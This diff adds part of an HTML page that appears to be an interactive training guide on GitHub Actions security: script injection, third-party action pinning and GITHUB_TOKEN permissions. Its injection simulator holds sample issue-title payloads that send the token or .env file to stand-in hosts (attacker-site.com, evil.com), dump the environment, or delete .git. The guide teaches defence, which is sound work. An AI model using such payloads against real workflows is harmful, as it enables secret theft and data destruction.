@@ -1,0 +1,1277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GitHub Actions Security Masterclass</title>
+  <!-- Google Fonts & Font Awesome Icons -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&family=Inter:wght@300;400;500;600;700;800&family=Outfit:wght@500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  
+  <style>
+    :root {
+      --bg-main: #0B0F19;
+      --bg-card: rgba(22, 30, 49, 0.7);
+      --bg-card-border: rgba(255, 255, 255, 0.08);
+      --bg-card-hover: rgba(30, 42, 69, 0.8);
+      
+      --accent-purple: #8B5CF6;
+      --accent-purple-glow: rgba(139, 92, 246, 0.3);
+      --accent-cyan: #06B6D4;
+      --accent-cyan-glow: rgba(6, 182, 212, 0.3);
+      --accent-emerald: #10B981;
+      --accent-emerald-glow: rgba(16, 185, 129, 0.3);
+      --accent-rose: #F43F5E;
+      --accent-rose-glow: rgba(244, 63, 94, 0.3);
+      --accent-amber: #F59E0B;
+
+      --text-main: #F3F4F6;
+      --text-muted: #9CA3AF;
+      --text-dim: #6B7280;
+
+      --font-heading: 'Outfit', sans-serif;
+      --font-body: 'Inter', sans-serif;
+      --font-code: 'Fira Code', monospace;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background-color: var(--bg-main);
+      color: var(--text-main);
+      font-family: var(--font-body);
+      line-height: 1.6;
+      min-height: 100vh;
+      overflow-x: hidden;
+      background-image: 
+        radial-gradient(circle at 15% 15%, rgba(139, 92, 246, 0.15) 0%, transparent 40%),
+        radial-gradient(circle at 85% 85%, rgba(6, 182, 212, 0.15) 0%, transparent 40%);
+      background-attachment: fixed;
+    }
+
+    /* Layout Containers */
+    .container {
+      max-width: 1280px;
+      margin: 0 auto;
+      padding: 2rem;
+    }
+
+    /* Header */
+    header {
+      text-align: center;
+      padding: 3rem 1rem 2rem;
+      position: relative;
+    }
+
+    .badge-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      padding: 0.4rem 1rem;
+      border-radius: 9999px;
+      background: rgba(139, 92, 246, 0.15);
+      border: 1px solid rgba(139, 92, 246, 0.3);
+      color: #A78BFA;
+      font-size: 0.85rem;
+      font-weight: 600;
+      letter-spacing: 0.05em;
+      text-transform: uppercase;
+      margin-bottom: 1rem;
+    }
+
+    h1 {
+      font-family: var(--font-heading);
+      font-size: 3rem;
+      font-weight: 800;
+      background: linear-gradient(135deg, #FFFFFF 0%, #C084FC 50%, #38BDF8 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 1rem;
+      letter-spacing: -0.02em;
+    }
+
+    header p {
+      color: var(--text-muted);
+      font-size: 1.15rem;
+      max-width: 750px;
+      margin: 0 auto;
+    }
+
+    /* Navigation Tabs */
+    .nav-tabs {
+      display: flex;
+      justify-content: center;
+      gap: 0.75rem;
+      margin: 2.5rem 0 3rem;
+      flex-wrap: wrap;
+    }
+
+    .tab-btn {
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid var(--bg-card-border);
+      color: var(--text-muted);
+      padding: 0.8rem 1.4rem;
+      border-radius: 12px;
+      font-family: var(--font-body);
+      font-weight: 600;
+      font-size: 0.95rem;
+      cursor: pointer;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      display: flex;
+      align-items: center;
+      gap: 0.6rem;
+      backdrop-filter: blur(10px);
+    }
+
+    .tab-btn:hover {
+      background: rgba(255, 255, 255, 0.08);
+      color: #FFF;
+      transform: translateY(-2px);
+    }
+
+    .tab-btn.active {
+      background: linear-gradient(135deg, rgba(139, 92, 246, 0.25), rgba(6, 182, 212, 0.25));
+      border-color: var(--accent-purple);
+      color: #FFF;
+      box-shadow: 0 4px 20px var(--accent-purple-glow);
+    }
+
+    /* Tab Content Sections */
+    .tab-content {
+      display: none;
+      animation: fadeIn 0.4s ease-in-out forwards;
+    }
+
+    .tab-content.active {
+      display: block;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Grid Layouts */
+    .grid-3 {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(340px, 1fr));
+      gap: 1.5rem;
+    }
+
+    .grid-2 {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(450px, 1fr));
+      gap: 2rem;
+    }
+
+    /* Glass Cards */
+    .glass-card {
+      background: var(--bg-card);
+      border: 1px solid var(--bg-card-border);
+      border-radius: 20px;
+      padding: 2rem;
+      backdrop-filter: blur(16px);
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .glass-card:hover {
+      border-color: rgba(255, 255, 255, 0.18);
+      transform: translateY(-4px);
+      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.3);
+    }
+
+    .glass-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 3px;
+      background: linear-gradient(90deg, var(--accent-purple), var(--accent-cyan));
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+
+    .glass-card:hover::before {
+      opacity: 1;
+    }
+
+    /* Section Headings inside Cards */
+    .card-icon {
+      width: 54px;
+      height: 54px;
+      border-radius: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.5rem;
+      margin-bottom: 1.25rem;
+    }
+
+    .icon-purple {
+      background: rgba(139, 92, 246, 0.15);
+      color: #A78BFA;
+      border: 1px solid rgba(139, 92, 246, 0.3);
+    }
+
+    .icon-cyan {
+      background: rgba(6, 182, 212, 0.15);
+      color: #67E8F9;
+      border: 1px solid rgba(6, 182, 212, 0.3);
+    }
+
+    .icon-rose {
+      background: rgba(244, 63, 94, 0.15);
+      color: #FDA4AF;
+      border: 1px solid rgba(244, 63, 94, 0.3);
+    }
+
+    .icon-emerald {
+      background: rgba(16, 185, 129, 0.15);
+      color: #6EE7B7;
+      border: 1px solid rgba(16, 185, 129, 0.3);
+    }
+
+    .card-title {
+      font-family: var(--font-heading);
+      font-size: 1.5rem;
+      font-weight: 700;
+      margin-bottom: 0.75rem;
+      color: #FFF;
+    }
+
+    .card-desc {
+      color: var(--text-muted);
+      font-size: 0.98rem;
+      margin-bottom: 1.25rem;
+    }
+
+    /* Pills & Key Points */
+    .point-list {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 0.75rem;
+    }
+
+    .point-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 0.75rem;
+      font-size: 0.92rem;
+      color: #D1D5DB;
+    }
+
+    .point-item i {
+      margin-top: 0.25rem;
+      font-size: 0.9rem;
+    }
+
+    /* Code Blocks */
+    .code-container {
+      background: #06080F;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 12px;
+      padding: 1.25rem;
+      font-family: var(--font-code);
+      font-size: 0.88rem;
+      overflow-x: auto;
+      max-width: 100%;
+      box-sizing: border-box;
+      color: #E5E7EB;
+      position: relative;
+      margin: 1rem 0;
+    }
+
+    .code-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding-bottom: 0.6rem;
+      margin-bottom: 0.8rem;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+      font-size: 0.78rem;
+      color: var(--text-dim);
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+
+    .code-vulnerable {
+      border-left: 3px solid var(--accent-rose);
+    }
+
+    .code-secure {
+      border-left: 3px solid var(--accent-emerald);
+    }
+
+    .code-comment { color: #6B7280; font-style: italic; }
+    .code-key { color: #C084FC; font-weight: 500; }
+    .code-string { color: #34D399; }
+    .code-var { color: #38BDF8; }
+    .code-danger { color: #F43F5E; font-weight: 600; background: rgba(244, 63, 94, 0.15); padding: 0.1rem 0.3rem; border-radius: 4px; }
+    .code-safe { color: #34D399; font-weight: 600; background: rgba(16, 185, 129, 0.15); padding: 0.1rem 0.3rem; border-radius: 4px; }
+
+    /* Interactive Simulator */
+    .sim-box {
+      background: rgba(15, 23, 42, 0.9);
+      border: 1px solid var(--bg-card-border);
+      border-radius: 16px;
+      padding: 1.75rem;
+      margin-top: 1rem;
+    }
+
+    .form-group {
+      margin-bottom: 1.25rem;
+    }
+
+    label {
+      display: block;
+      font-size: 0.88rem;
+      font-weight: 600;
+      color: var(--text-muted);
+      margin-bottom: 0.5rem;
+    }
+
+    input[type="text"], select {
+      width: 100%;
+      background: rgba(0, 0, 0, 0.4);
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      border-radius: 10px;
+      padding: 0.8rem 1rem;
+      color: #FFF;
+      font-family: var(--font-code);
+      font-size: 0.92rem;
+      outline: none;
+      transition: all 0.25s ease;
+    }
+
+    input[type="text"]:focus, select:focus {
+      border-color: var(--accent-purple);
+      box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.2);
+    }
+
+    .preset-btns {
+      display: flex;
+      gap: 0.5rem;
+      flex-wrap: wrap;
+      margin-bottom: 1rem;
+    }
+
+    .chip-btn {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      color: var(--text-muted);
+      padding: 0.35rem 0.75rem;
+      border-radius: 999px;
+      font-size: 0.8rem;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .chip-btn:hover {
+      background: rgba(139, 92, 246, 0.2);
+      color: #FFF;
+      border-color: var(--accent-purple);
+    }
+
+    .output-comparison {
+      display: grid;
+      grid-template-columns: minmax(0, 1fr) minmax(0, 1fr);
+      gap: 1.25rem;
+      margin-top: 1rem;
+      width: 100%;
+    }
+
+    @media (max-width: 1100px) {
+      .output-comparison {
+        grid-template-columns: minmax(0, 1fr);
+      }
+    }
+
+    .output-panel {
+      border-radius: 12px;
+      padding: 1.25rem;
+      font-size: 0.88rem;
+      min-width: 0;
+      width: 100%;
+      box-sizing: border-box;
+      overflow: hidden;
+    }
+
+    .output-bad {
+      background: rgba(244, 63, 94, 0.06);
+      border: 1px solid rgba(244, 63, 94, 0.3);
+    }
+
+    .output-good {
+      background: rgba(16, 185, 129, 0.06);
+      border: 1px solid rgba(16, 185, 129, 0.3);
+    }
+
+    .panel-header {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      font-weight: 700;
+      margin-bottom: 0.75rem;
+      font-size: 0.95rem;
+    }
+
+    /* Trust Spectrum Level Card */
+    .spectrum-card {
+      position: relative;
+      padding: 1.5rem;
+      border-radius: 16px;
+      background: rgba(255, 255, 255, 0.02);
+      border: 1px solid var(--bg-card-border);
+      margin-bottom: 1rem;
+      display: flex;
+      align-items: center;
+      gap: 1.5rem;
+    }
+
+    .spectrum-level-badge {
+      min-width: 140px;
+      text-align: center;
+      padding: 0.75rem 1rem;
+      border-radius: 12px;
+      font-weight: 700;
+      font-size: 0.9rem;
+    }
+
+    .level-high {
+      background: linear-gradient(135deg, rgba(16, 185, 129, 0.2), rgba(6, 182, 212, 0.2));
+      border: 1px solid var(--accent-emerald);
+      color: #6EE7B7;
+    }
+
+    .level-mid {
+      background: linear-gradient(135deg, rgba(245, 158, 11, 0.2), rgba(139, 92, 246, 0.2));
+      border: 1px solid var(--accent-amber);
+      color: #FCD34D;
+    }
+
+    .level-low {
+      background: linear-gradient(135deg, rgba(244, 63, 94, 0.2), rgba(239, 68, 68, 0.2));
+      border: 1px solid var(--accent-rose);
+      color: #FDA4AF;
+    }
+
+    /* Checkboxes for Permissions Generator */
+    .perm-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+      gap: 0.75rem;
+      margin: 1rem 0;
+    }
+
+    .perm-item {
+      background: rgba(0, 0, 0, 0.3);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 10px;
+      padding: 0.75rem 1rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    .perm-item:hover {
+      border-color: rgba(255, 255, 255, 0.2);
+    }
+
+    .perm-item span {
+      font-family: var(--font-code);
+      font-size: 0.85rem;
+      color: #E5E7EB;
+    }
+
+    .toggle-switch {
+      position: relative;
+      width: 40px;
+      height: 22px;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 999px;
+      transition: background 0.3s;
+    }
+
+    .toggle-switch::after {
+      content: '';
+      position: absolute;
+      top: 3px;
+      left: 3px;
+      width: 16px;
+      height: 16px;
+      background: #FFF;
+      border-radius: 50%;
+      transition: transform 0.3s;
+    }
+
+    .perm-item.active .toggle-switch {
+      background: var(--accent-purple);
+    }
+
+    .perm-item.active .toggle-switch::after {
+      transform: translateX(18px);
+    }
+
+    /* Comparison Table */
+    .comp-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 1.5rem;
+      font-size: 0.92rem;
+    }
+
+    .comp-table th, .comp-table td {
+      padding: 1rem 1.25rem;
+      text-align: left;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+    }
+
+    .comp-table th {
+      background: rgba(0, 0, 0, 0.4);
+      color: var(--text-muted);
+      font-weight: 600;
+      text-transform: uppercase;
+      font-size: 0.8rem;
+      letter-spacing: 0.05em;
+    }
+
+    .comp-table tr:hover {
+      background: rgba(255, 255, 255, 0.02);
+    }
+
+    /* Footer */
+    footer {
+      text-align: center;
+      padding: 3rem 1rem;
+      color: var(--text-dim);
+      font-size: 0.9rem;
+      border-top: 1px solid rgba(255, 255, 255, 0.06);
+      margin-top: 4rem;
+    }
+
+    /* Responsive adjustments */
+    @media (max-width: 900px) {
+      h1 { font-size: 2.2rem; }
+      .container { padding: 1rem; }
+      .spectrum-card { flex-direction: column; align-items: flex-start; }
+      .spectrum-level-badge { width: 100%; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <!-- Header -->
+    <header>
+      <div class="badge-tag">
+        <i class="fa-solid fa-shield-halved"></i> GitHub Actions Security Guide
+      </div>
+      <h1>Security Concerns & Secure Practices</h1>
+      <p>An interactive, real-world developer guide dissecting script injection risks, third-party action security, permission scoping, and hardening workflows.</p>
+    </header>
+
+    <!-- Navigation Tabs -->
+    <div class="nav-tabs">
+      <button class="tab-btn active" onclick="switchTab('overview')">
+        <i class="fa-solid fa-layer-group"></i> 1. Core Concerns Overview
+      </button>
+      <button class="tab-btn" onclick="switchTab('injection')">
+        <i class="fa-solid fa-syringe"></i> 2. Script Injection Simulator
+      </button>
+      <button class="tab-btn" onclick="switchTab('spectrum')">
+        <i class="fa-solid fa-shield-cat"></i> 3. Using Actions Securely
+      </button>
+      <button class="tab-btn" onclick="switchTab('permissions')">
+        <i class="fa-solid fa-key"></i> 4. Permissions Generator
+      </button>
+      <button class="tab-btn" onclick="switchTab('code-compare')">
+        <i class="fa-solid fa-code-compare"></i> 5. Workspace Project Files
+      </button>
+    </div>
+
+    <!-- TAB 1: Core Concerns Overview (Image 1 Breakdown) -->
+    <div id="overview" class="tab-content active">
+      <div class="grid-3">
+        <!-- Card 1: Script Injection -->
+        <div class="glass-card">
+          <div class="card-icon icon-purple">
+            <i class="fa-solid fa-syringe"></i>
+          </div>
+          <h2 class="card-title">1. Script Injection</h2>
+          <p class="card-desc">Occurs when untrusted external values (like issue titles or PR branch names) are inline-expanded inside shell commands.</p>
+          
+          <ul class="point-list">
+            <li class="point-item">
+              <i class="fa-solid fa-triangle-exclamation" style="color: var(--accent-rose);"></i>
+              <div><strong>The Risk:</strong> GitHub interpolates <code>${{ ... }}</code> before passing to bash. Attackers inject command separators (<code>;</code>, <code>&amp;&amp;</code>, <code>|</code>) to execute arbitrary commands.</div>
+            </li>
+            <li class="point-item">
+              <i class="fa-solid fa-lightbulb" style="color: var(--accent-amber);"></i>
+              <div><strong>Real Dev Scenario:</strong> An issue title containing <code>Fix bug"; env | curl ...</code> dumps your repo secrets to a rogue server.</div>
+            </li>
+            <li class="point-item">
+              <i class="fa-solid fa-circle-check" style="color: var(--accent-emerald);"></i>
+              <div><strong>Fix / Mitigation:</strong> Bind inputs to <strong>Environment Variables</strong> (e.g. <code>env: TITLE: ${{ ... }}</code>) or use <code>github-script</code>.</div>
+            </li>
+          </ul>
+        </div>
+
+        <!-- Card 2: Malicious Third-Party Actions -->
+        <div class="glass-card">
+          <div class="card-icon icon-rose">
+            <i class="fa-solid fa-clapperboard"></i>
+          </div>
+          <h2 class="card-title">2. Third-Party Actions</h2>
+          <p class="card-desc">Actions execute code in your runner with full access to secrets, environment variables, and filesystem repository data.</p>
+          
+          <ul class="point-list">
+            <li class="point-item">
+              <i class="fa-solid fa-triangle-exclamation" style="color: var(--accent-rose);"></i>
+              <div><strong>The Risk:</strong> Supply chain attack. A third-party action could be modified, compromised, or tag-hijacked (updating <code>@v1</code> to point to malware).</div>
+            </li>
+            <li class="point-item">
+              <i class="fa-solid fa-lightbulb" style="color: var(--accent-amber);"></i>
+              <div><strong>Real Dev Scenario:</strong> Importing an unverified Marketplace action that secretly reads <code>secrets.AWS_SECRET_ACCESS_KEY</code> and exfiltrates it.</div>
+            </li>
+            <li class="point-item">
+              <i class="fa-solid fa-circle-check" style="color: var(--accent-emerald);"></i>
+              <div><strong>Fix / Mitigation:</strong> Pin actions to full 40-character <strong>Commit SHAs</strong>, use verified publishers, or write internal custom actions.</div>
+            </li>
+          </ul>
+        </div>
+
+        <!-- Card 3: Permission Issues -->
+        <div class="glass-card">
+          <div class="card-icon icon-cyan">
+            <i class="fa-solid fa-key"></i>
+          </div>
+          <h2 class="card-title">3. Permission Issues</h2>
+          <p class="card-desc">Default repository settings often grant maximum write privileges to the automatic <code>GITHUB_TOKEN</code>.</p>
+          
+          <ul class="point-list">
+            <li class="point-item">
+              <i class="fa-solid fa-triangle-exclamation" style="color: var(--accent-rose);"></i>
+              <div><strong>The Risk:</strong> If a job is compromised, the attacker inherits full write permissions (e.g., pushing code to <code>main</code>, overwriting releases).</div>
+            </li>
+            <li class="point-item">
+              <i class="fa-solid fa-lightbulb" style="color: var(--accent-amber);"></i>
+              <div><strong>Real Dev Scenario:</strong> A simple issue-labeling job has broad write permissions to repository contents and workflow files.</div>
+            </li>
+            <li class="point-item">
+              <i class="fa-solid fa-circle-check" style="color: var(--accent-emerald);"></i>
+              <div><strong>Fix / Mitigation:</strong> Apply the <strong>Principle of Least Privilege</strong>. Set <code>permissions: {}</code> top-level and explicitly declare minimum scope per job.</div>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <!-- TAB 2: Script Injection Simulator -->
+    <div id="injection" class="tab-content">
+      <div class="glass-card">
+        <h2 class="card-title"><i class="fa-solid fa-syringe" style="color: var(--accent-purple);"></i> Interactive Script Injection Simulator</h2>
+        <p class="card-desc">Type a simulated user issue title below to see how inline shell evaluation executes malicious payloads vs how binding to an Environment Variable protects your workflow.</p>
+
+        <div class="sim-box">
+          <div class="form-group">
+            <label>Simulated Issue Title Payload (User Input):</label>
+            <input type="text" id="simPayload" value='Fix login bug"; curl https://attacker-site.com/steal?token=$GITHUB_TOKEN #'>
+          </div>
+
+          <div class="preset-btns">
+            <span style="font-size: 0.8rem; color: var(--text-dim); align-self: center;">Quick Payload Presets:</span>
+            <button class="chip-btn" onclick="setPayload('Fix bug &amp;&amp; env | grep SECRET')">Env Exfiltration</button>
+            <button class="chip-btn" onclick="setPayload('Normal Bug Report in Login')">Safe Normal Input</button>
+            <button class="chip-btn" onclick="setPayload('Crash&quot;; rm -rf .git #')">Destructive Command</button>
+            <button class="chip-btn" onclick="setPayload('Title&quot;; curl -X POST -d @.env https://evil.com #')">Secret Theft</button>
+          </div>
+
+          <div class="output-comparison">
+            <!-- Vulnerable Output -->
+            <div class="output-panel output-bad">
+              <div class="panel-header" style="color: var(--accent-rose);">
+                <i class="fa-solid fa-bug"></i> Vulnerable Implementation (Inline Concatenation)
+              </div>
+              <p style="font-size: 0.82rem; color: var(--text-muted); margin-bottom: 0.5rem;">YAML Definition:</p>
+              <div class="code-container code-vulnerable">
+                <span class="code-key">run:</span> |<br>
+                &nbsp;&nbsp;title=<span class="code-danger" id="vulnYamlCode"></span><br>
+                &nbsp;&nbsp;if [[ "$title" == *"bug"* ]]; then ...
+              </div>
+
+              <p style="font-size: 0.82rem; color: var(--text-muted); margin-bottom: 0.5rem;">Actual Bash Execution Stream:</p>
+              <div class="code-container" style="background: #18080B; color: #FDA4AF;" id="vulnBashStream">
+              </div>
+              <div id="vulnStatus" style="font-weight: 600; font-size: 0.85rem; color: var(--accent-rose); margin-top: 0.5rem;">
+              </div>
+            </div>
+
+            <!-- Secure Output -->
+            <div class="output-panel output-good">
+              <div class="panel-header" style="color: var(--accent-emerald);">
+                <i class="fa-solid fa-shield-halved"></i> Secure Implementation (Environment Variable)
+              </div>
+              <p style="font-size: 0.82rem; color: var(--text-muted); margin-bottom: 0.5rem;">YAML Definition:</p>
+              <div class="code-container code-secure">
+                <span class="code-key">env:</span><br>
+                &nbsp;&nbsp;<span class="code-var">TITLE:</span> ${{ github.event.issue.title }}<br>
+                <span class="code-key">run:</span> |<br>
+                &nbsp;&nbsp;if [[ <span class="code-safe">"$TITLE"</span> == *"bug"* ]]; then ...
+              </div>
+
+              <p style="font-size: 0.82rem; color: var(--text-muted); margin-bottom: 0.5rem;">Actual Bash Execution Stream:</p>
+              <div class="code-container" style="background: #051A14; color: #6EE7B7;" id="safeBashStream">
+              </div>
+              <div id="safeStatus" style="font-weight: 600; font-size: 0.85rem; color: var(--accent-emerald); margin-top: 0.5rem;">
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- TAB 3: Using Actions Securely (Image 2 Spectrum) -->
+    <div id="spectrum" class="tab-content">
+      <div class="glass-card">
+        <h2 class="card-title"><i class="fa-solid fa-shield-cat" style="color: var(--accent-cyan);"></i> Using Actions Securely — Trust &amp; Security Spectrum</h2>
+        <p class="card-desc">Direct breakdown of Image 2: Balancing developer effort vs security guarantees when importing workflow actions.</p>
+
+        <div style="margin-top: 2rem;">
+          <!-- Level 1 -->
+          <div class="spectrum-card">
+            <div class="spectrum-level-badge level-high">
+              <i class="fa-solid fa-crown"></i> Highest Security
+            </div>
+            <div>
+              <h3 style="color: #FFF; font-size: 1.15rem; margin-bottom: 0.3rem;">Only Use Your Own Custom Actions</h3>
+              <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 0.5rem;">
+                Build and maintain custom internal composite actions or JavaScript actions in house. 
+              </p>
+              <span style="font-size: 0.82rem; background: rgba(139, 92, 246, 0.2); color: #C084FC; padding: 0.2rem 0.6rem; border-radius: 6px;">
+                <i class="fa-solid fa-triangle-exclamation"></i> Trade-off: Considerable amount of maintenance effort required.
+              </span>
+            </div>
+          </div>
+
+          <!-- Level 2 -->
+          <div class="spectrum-card">
+            <div class="spectrum-level-badge level-mid">
+              <i class="fa-solid fa-user-check"></i> Medium Security
+            </div>
+            <div>
+              <h3 style="color: #FFF; font-size: 1.15rem; margin-bottom: 0.3rem;">Only Use Actions by Verified Creators</h3>
+              <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 0.5rem;">
+                Restrict usage to GitHub Marketplace Verified Publishers (e.g. <code>actions/*</code>, <code>aws-actions/*</code>, <code>docker/*</code>).
+              </p>
+              <span style="font-size: 0.82rem; background: rgba(245, 158, 11, 0.2); color: #FCD34D; padding: 0.2rem 0.6rem; border-radius: 6px;">
+                <i class="fa-solid fa-info-circle"></i> Note: Still not a 100% guarantee! Maintainer accounts can still suffer breach or dependency drift.
+              </span>
+            </div>
+          </div>
+
+          <!-- Level 3 -->
+          <div class="spectrum-card">
+            <div class="spectrum-level-badge level-low">
+              <i class="fa-solid fa-triangle-exclamation"></i> Lowest Security
+            </div>
+            <div>
+              <h3 style="color: #FFF; font-size: 1.15rem; margin-bottom: 0.3rem;">Use All Public Actions (Unchecked Marketplace)</h3>
+              <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 0.5rem;">
+                Importing arbitrary community actions without verification.
+              </p>
+              <span style="font-size: 0.82rem; background: rgba(244, 63, 94, 0.2); color: #FDA4AF; padding: 0.2rem 0.6rem; border-radius: 6px;">
+                <i class="fa-solid fa-shield-virus"></i> Mandatory Requirement: You MUST manually audit all Action source code first!
+              </span>
+            </div>
+          </div>
+        </div>
+
+        <!-- SHA Pinning Best Practice -->
+        <div style="background: rgba(6, 182, 212, 0.08); border: 1px solid rgba(6, 182, 212, 0.25); border-radius: 14px; padding: 1.5rem; margin-top: 2rem;">
+          <h3 style="color: #67E8F9; font-size: 1.1rem; display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.5rem;">
+            <i class="fa-solid fa-thumbtack"></i> Golden Rule: Always Pin Actions to Commit SHA
+          </h3>
+          <p style="font-size: 0.9rem; color: #D1D5DB; margin-bottom: 1rem;">
+            Tags (like <code>@v4</code> or <code>@main</code>) are mutable and can be silently moved by an attacker to point to malicious commits. A 40-character commit SHA is cryptographically immutable.
+          </p>
+          <div class="code-container code-secure">
+            <span class="code-comment"># ❌ Mutable &amp; Risky (Tag can be hijacked):</span><br>
+            <span class="code-key">uses:</span> actions/checkout@v4<br><br>
+            <span class="code-comment"># ✅ Immutable &amp; Secure (Pinned SHA):</span><br>
+            <span class="code-key">uses:</span> actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 <span class="code-comment"># v4.1.1</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- TAB 4: Permissions Generator -->
+    <div id="permissions" class="tab-content">
+      <div class="glass-card">
+        <h2 class="card-title"><i class="fa-solid fa-key" style="color: var(--accent-purple);"></i> Fine-Grained Permissions Generator &amp; GITHUB_TOKEN Exploit Simulator</h2>
+        <p class="card-desc">Feel and test how configuring fine-grained permissions restricts the automatic <code>GITHUB_TOKEN</code> capabilities to prevent repository compromise.</p>
+
+        <!-- Visual GITHUB_TOKEN Power Meter & Mode Status -->
+        <div style="background: rgba(15, 23, 42, 0.9); border: 1px solid var(--bg-card-border); border-radius: 16px; padding: 1.5rem; margin-top: 1.5rem;">
+          <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem; margin-bottom: 1rem;">
+            <div>
+              <span style="font-size: 0.82rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.05em;">Token Security State:</span>
+              <h3 id="tokenStateTitle" style="font-size: 1.25rem; font-weight: 700; color: #FFF;"></h3>
+            </div>
+            <div style="text-align: right;">
+              <span style="font-size: 0.82rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.05em;">Token Power Level (Blast Radius):</span>
+              <div id="tokenPowerValue" style="font-size: 1.3rem; font-weight: 800; font-family: var(--font-code);"></div>
+            </div>
+          </div>
+
+          <!-- Progress Bar -->
+          <div style="width: 100%; height: 12px; background: rgba(0, 0, 0, 0.5); border-radius: 999px; overflow: hidden; border: 1px solid rgba(255, 255, 255, 0.08);">
+            <div id="tokenPowerBar" style="height: 100%; width: 50%; transition: width 0.4s ease, background 0.4s ease;"></div>
+          </div>
+        </div>
+
+        <div style="margin-top: 1.5rem;">
+          <label>Toggle &amp; Configure Permissions Scope:</label>
+          <div class="perm-grid" id="permContainer">
+            <!-- Generated dynamically by JS -->
+          </div>
+
+          <p style="font-size: 0.88rem; color: var(--text-muted); margin: 1.25rem 0 0.5rem;">Generated YAML Permissions Block:</p>
+          <div class="code-container code-secure" id="yamlPermOutput">
+          </div>
+        </div>
+
+        <!-- Simulated API Attack Suite -->
+        <div style="margin-top: 2rem; background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 16px; padding: 1.5rem;">
+          <h3 style="font-size: 1.1rem; color: #FFF; margin-bottom: 0.5rem; display: flex; align-items: center; gap: 0.5rem;">
+            <i class="fa-solid fa-code" style="color: var(--accent-cyan);"></i> How GITHUB_TOKEN is Accessed theoretically in Code
+          </h3>
+          <p style="font-size: 0.88rem; color: var(--text-muted); margin-bottom: 1rem;">
+            In GitHub Actions workflows, the automatic token is accessed via expressions <code>${{ secrets.GITHUB_TOKEN }}</code> or <code>${{ github.token }}</code> in 3 primary patterns:
+          </p>
+
+          <div class="grid-3" style="gap: 1rem; margin-bottom: 1.5rem;">
+            <div style="background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 10px; padding: 1rem;">
+              <h4 style="color: #67E8F9; font-size: 0.9rem; margin-bottom: 0.4rem;">1. HTTP API Authorization Header</h4>
+              <div class="code-container" style="font-size: 0.78rem; margin: 0.3rem 0;">
+-H 'authorization: Bearer ${{ secrets.GITHUB_TOKEN }}'
+              </div>
+              <p style="font-size: 0.8rem; color: var(--text-dim);">Passed directly in cURL or fetch HTTP requests (as in <code>label-issues-real.yml</code>).</p>
+            </div>
+
+            <div style="background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 10px; padding: 1rem;">
+              <h4 style="color: #C084FC; font-size: 0.9rem; margin-bottom: 0.4rem;">2. Action Input (`with:` parameter)</h4>
+              <div class="code-container" style="font-size: 0.78rem; margin: 0.3rem 0;">
+uses: actions/checkout@v4
+with:
+  token: ${{ secrets.GITHUB_TOKEN }}
+              </div>
+              <p style="font-size: 0.8rem; color: var(--text-dim);">Passed into composite or JS actions for internal Git or API authentication.</p>
+            </div>
+
